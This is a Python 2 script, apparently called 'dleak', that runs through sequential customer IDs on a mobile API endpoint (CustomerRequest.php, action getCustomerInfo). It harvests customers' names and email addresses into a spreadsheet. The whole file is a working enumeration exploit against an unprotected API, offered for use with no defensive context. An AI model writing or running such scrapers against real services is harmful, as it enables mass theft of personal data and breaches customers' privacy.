#!/usr/bin/python
import json
import requests
from lxml import html
import xlwt 

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
class dleak(object):
    def run(self):
        book = xlwt.Workbook(encoding="utf-8")

        sheet1 = book.add_sheet("Person")

        sheet1.write(0, 0, "Sr.")
        sheet1.write(0, 1, "name")
        sheet1.write(0, 2, "email")
        sheet1.write(0, 3, "phone")
        sheet1.write(0, 4, "gender")
        sheet1.write(0, 5, "address")

        sheet1.write(1, 0, "")
        sheet1.write(1, 1, "Not Null")
        sheet1.write(1, 2, "Not Null")
        sheet1.write(1, 3, "Nullable")
        sheet1.write(1, 4, "Nullable")
        sheet1.write(1, 5, "Nullable")

        req = requests.session()
        index = 0
        nulCount = 0
        _foundCount = 0
        tf = True
        row= 2
        while nulCount<10:
            index = index + 1
            _id = str(index)
            _url = "websitelink/mobile_api/CustomerRequest.php?params={\"action\":\"getCustomerInfo\",\"customerId\":\"%s\"}" % _id
            result = None
            try:
                result = req.get(_url) 
                
                page = html.fromstring(result.text)
                if page.text <> "null":
                    data = json.loads(page.text.encode('utf8'))
                    if(data['id'] == "nil"):
                        print bcolors.WARNING + "no Data" + bcolors.ENDC
                        nulCount = nulCount +1
                    else:
                        _foundCount = _foundCount +1
                        nulCount = 0
                        _name = data['firstname'] + " " + (data['lastname'] if data['lastname'] is not None else "")
                        _email = data['email']
                        _name = _name.replace(",","")
                        print bcolors.BOLD+ "found : "+bcolors.OKBLUE + str(_foundCount) + bcolors.ENDC
                        print bcolors.OKGREEN+"Name : " + bcolors.ENDC + _name
                        print bcolors.OKGREEN+"E-mail : " + bcolors.ENDC + _email
                        sheet1.write(row, 0, "")
                        sheet1.write(row, 1, _name)
                        sheet1.write(row, 2, _email)
                        row = row + 1
                else:
                    print bcolors.FAIL + "no Data" + bcolors.ENDC
            except Exception:
                print "error"
        book.save("Person.xlsx")
        

if __name__ == '__main__':
    dleak().run()
